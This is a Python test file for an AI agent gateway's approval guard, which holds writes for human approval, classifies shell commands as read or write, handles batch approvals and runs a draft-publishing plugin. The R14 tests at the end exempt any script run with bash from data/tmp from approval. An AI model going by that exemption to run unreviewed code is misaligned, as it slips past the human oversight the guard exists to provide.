    # ApprovalGuard pending_write 收集 reason
    gsrc = open("core/gateway/guards/registry.py", encoding="utf-8").read()
    assert '"reason": str(args.get("reason", "") or "")[:200]' in gsrc, "pending_write 缺 reason"


def test_r3_approval_guard_pending_reason():
    """R3: ApprovalGuard 生成 pending_write 含 reason; write_file 无 reason 提示补理由"""
    from core.gateway.guards.registry import ApprovalGuard

    g = ApprovalGuard()
    d = g.check(
        {
            "tool": "write_file",
            "args": {"path": "docs/a.md", "content": "x", "reason": "修复文档"},
            "session_id": "s1",
            "tool_call_id": "c1",
            "approved": {},
        }
    )
    assert d is not None and d.get("status") == "write_pending"
    pw = d.get("pending_write") or {}
    assert pw.get("reason") == "修复文档", "reason 应进 pending_write"
    # 无 reason → 提示补理由(不硬拒)
    d2 = g.check(
        {
            "tool": "write_file",
            "args": {"path": "docs/b.md", "content": "y"},
            "session_id": "s1",
            "tool_call_id": "c2",
            "approved": {},
        }
    )
    assert d2 is not None
    assert "reason" in str(d2.get("error") or "") or "补理由" in str(d2.get("error") or ""), "无 reason 应提示"


def test_r3_batch_approval_actions():
    """R3: 批量审批动作 — approve_all 全批 / approve_selected 选批 / reject 全拒"""
    # 模拟批量 pending 结构 + 动作解析(与 _handle_write_approval 批量分支逻辑一致)
    pending = {
        "id": "b1",
        "batch": True,
        "items": [
            {"id": "w1", "tool": "write_file", "path": "a.py", "reason": "r1"},
            {"id": "w2", "tool": "write_file", "path": "b.py", "reason": "r2"},
            {"id": "w3", "tool": "write_file", "path": "c.py", "reason": "r3"},
        ],
    }
    # approve_all
    sel = None
    approved = [i for i in pending["items"] if sel is None or i.get("id") in sel]
    assert len(approved) == 3, "approve_all 应全批"
    # approve_selected
    sel = {"w1", "w3"}
    approved = [i for i in pending["items"] if sel is None or i.get("id") in sel]
    assert [i["path"] for i in approved] == ["a.py", "c.py"], "approve_selected 按 ids 选批"
    remaining = [i for i in pending["items"] if i.get("id") not in sel]
    assert [i["path"] for i in remaining] == ["b.py"], "未批项保留"
    # 全批完清除
    assert len(remaining) == 1
    print("R3 batch actions: PASS")


def test_r3_bridge_collects_batch_wp():
    """R3: bridge 阶段1 收集同批多个 write_pending(批量卡)而非第一个就 break"""
    src = open("agent_gateway_enhanced.py", encoding="utf-8").read()
    tr = open("core/gateway/v9_bridge/tool_runner.py", encoding="utf-8").read()
    assert "_pre_wp_list" in tr, "缺批量收集列表"
    assert 'if _gst == "write_pending":' in tr, "write_pending 收集分支"
    assert "continue  # 继续收集同批其它写请求" in tr, "write_pending 应继续收集不 break"
    assert '"batch": True' in tr, "批量卡标记"
    assert "batch_pending" in tr, "批量卡响应字段"
    _ap = open("core/gateway/approval.py", encoding="utf-8").read()
    assert "approve_selected" in _ap, "批量动作 approve_selected(路由) — 已归位 approval.py"


# ===== 封面任务失控修复 (2026-08-31): fc-list 误审批/obsidian 递归/空 path =====
def test_r6_fc_list_not_classified_write():
    """R6: fc-list 只读命令(含 2>/dev/null)不应触发审批; cat> 写仍应判 write"""
    from core.gateway.sandbox_util import _classify_command

    assert _classify_command("fc-list :lang=zh file 2>/dev/null | head -20") == "read"
    assert _classify_command("fc-list :lang=zh file") == "read"
    assert _classify_command("grep foo bar.txt 2>/dev/null") == "read"
    assert _classify_command("ls -la 2>&1 | head") == "read"
    assert _classify_command("cat file.txt 2>/dev/null") == "read"
    # 写仍拦截
    assert _classify_command("cat > docs/x.md 2>/dev/null") == "write"
    assert _classify_command("echo x > /tmp/y") == "write"
    assert (
        _classify_command(
            "python3 -c " + chr(34) + "open(" + chr(39) + "x" + chr(39) + "," + chr(39) + "w" + chr(39) + ")" + chr(34)
        )
        == "write"
    )


def test_r6_obsidian_recursion_key():
    """R6: obsidian_knowledge 有唯一递归 key(不再落 <no-path> 被误判重复 5 次)"""
    from core.gateway.path_utils import _extract_tool_path

    assert _extract_tool_path({"action": "read", "sop_key": "平台发布工作流"}, "obsidian_knowledge") == "obsidian:read:平台发布工作流"
    assert (
        _extract_tool_path({"action": "write_draft", "platform": "知乎", "title": "测试"}, "obsidian_knowledge")
        == "obsidian:write_draft:知乎"
    )
    assert _extract_tool_path({}, "obsidian_knowledge") == "obsidian:<unknown>"
    assert "<no-path>" not in _extract_tool_path({"action": "list"}, "obsidian_knowledge")


def test_r6_write_file_empty_path_rejected():
    """R6: write_file 缺 path 直接拒绝(不进审批) — 防空 write_file() 无效审批"""
    from core.gateway.guards.registry import ApprovalGuard

    g = ApprovalGuard()
    d = g.check({"tool": "write_file", "args": {}, "session_id": "s1", "tool_call_id": "c1", "approved": {}})
    assert d is not None and d.get("status") == "forbidden", d
    assert "path" in str(d.get("error") or ""), "应提示缺 path"
    # 正常 write_file 仍走审批
    d2 = g.check(
        {
            "tool": "write_file",
            "args": {"path": "docs/a.md", "content": "x"},
            "session_id": "s1",
            "tool_call_id": "c2",
            "approved": {},
        }
    )
    assert d2 is not None and d2.get("status") == "write_pending", d2


def test_r6_sandbox_hint_has_font():
    """R6: 沙箱边界提示含中文字体路径(PIL 直接可用, 不探测系统字体)（S6-A 归位 round_start）"""
    src = open("core/gateway/v9_bridge/round_start.py", encoding="utf-8").read()
    assert "wqy-microhei.ttc" in src, "沙箱提示应含中文字体路径"


# ===== mark_published 任务失控修复 (2026-08-31): 本地操作不验证链接 =====
def test_r7_mark_published_schema_guides_local():
    """R7: obsidian_knowledge schema 描述明确 mark_published 是本地操作(不验证链接)"""
    import sys

    sys.path.insert(0, ".")
    from core.lib.gateway_helpers import _get_default_tools

    tools = _get_default_tools()
    ok = [t for t in tools if t.get("function", {}).get("name") == "obsidian_knowledge"]
    assert ok, "schema 应存在"
    desc = ok[0]["function"]["description"]
    assert "mark_published" in desc, "描述应含 mark_published"
    assert "write_draft" in desc, "描述应含 write_draft"
    assert "本地" in desc, "应明确是本地操作"
    assert "不要用 browse/fetch 验证链接" in desc, "应明确不验证链接"


def test_r7_mark_published_relative_path(tmp_path, monkeypatch):
    """R7: mark_published 支持相对路径(草稿箱/知乎/xxx.md), 本地操作无需网络"""
    import sys

    sys.path.insert(0, ".")
    import core.plugins.draft_box.base as db

    monkeypatch.setattr(db, "_vault_root", lambda: tmp_path)
    from core.plugins.draft_box import get_draft_plugin

    p = get_draft_plugin("知乎")
    # 先写草稿
    r = p.write_draft("发布测试", "内容", tags=["测试"])
    assert r.get("success"), r
    rel = r["rel_path"]  # 草稿箱/知乎/xxx.md
    # mark_published 用相对路径 + post_url
    r2 = p.mark_published(rel, "https://zhuanlan.zhihu.com/p/123")
    assert r2.get("success"), r2
    pub = tmp_path / "已发布" / "知乎" / rel.split("/")[-1]
    assert pub.exists(), "应移入已发布/"
    txt = pub.read_text(encoding="utf-8")
    assert "status: published" in txt
    assert 'post_url: "https://zhuanlan.zhihu.com/p/123"' in txt


def test_r7_mark_published_nonexistent(tmp_path, monkeypatch):
    """R7: mark_published 草稿不存在返回明确错误(不抛异常)"""
    import sys

    sys.path.insert(0, ".")
    monkeypatch.setenv("PA_VAULT_DIR", str(tmp_path))   # 承 pm_1399 §二.3（批一）：vault 字面默认已拔（⛔ 倚本机）
    from core.plugins.draft_box import get_draft_plugin

    p = get_draft_plugin("知乎")
    r = p.mark_published("草稿箱/知乎/不存在.md", "https://x.com/1")
    assert r.get("success") is False, "不存在应失败"
    assert "草稿不存在" in r.get("error", ""), "应提示草稿不存在"


# ===== bash data/tmp 脚本审批豁免 (2026-09-03) =====
def test_r14_bash_tmp_script_exempt():
    """R14: bash 执行 data/tmp 调试脚本(如 qwen_merged.sh) → read 不触发审批"""
    from core.gateway.guards.registry import ApprovalGuard
    from core.gateway.sandbox_util import _classify_command

    assert _classify_command("bash data/tmp/qwen_merged.sh") == "read"
    assert _classify_command("bash data/tmp/test_script.sh") == "read"
    assert _classify_command("sh data/tmp/x.sh") == "read"
    # 非 data/tmp 脚本仍判 write
    assert _classify_command("bash scripts/deploy.sh") == "write"
    g = ApprovalGuard()
    d = g.check(
        {
            "tool": "execute_command",
            "args": {"command": "bash data/tmp/qwen_merged.sh"},
            "session_id": "s1",
            "tool_call_id": "c1",
            "approved": {},
        }
    )
    assert d is None, "data/tmp bash 脚本应放行"
    d2 = g.check(
        {
            "tool": "execute_command",
            "args": {"command": "bash scripts/deploy.sh"},
            "session_id": "s1",
            "tool_call_id": "c2",
            "approved": {},
        }
    )
    assert d2 is not None and d2.get("status") == "write_pending", "非 tmp 脚本仍审批"
